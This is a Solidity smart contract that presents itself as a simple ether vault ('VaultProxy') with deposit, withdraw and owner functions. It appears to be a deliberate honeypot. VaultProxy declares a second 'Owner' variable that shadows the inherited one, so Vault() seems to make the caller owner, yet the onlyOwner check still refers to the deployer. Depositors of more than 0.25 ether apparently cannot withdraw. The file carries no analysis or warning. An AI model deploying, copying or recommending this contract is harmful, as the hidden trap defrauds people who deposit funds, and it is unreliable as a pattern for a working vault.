pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
        assembly {
            let result := call(gas, target, callvalue, add(data, 0x20), mload(data), 0, 0)
            switch result case 0 { revert(0, 0) } default { }
        }
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            assembly {
                let success := call(gas, caller, amount, 0, 0, 0, 0)
                switch success case 0 { revert(0, 0) }
            }
        }
    }
}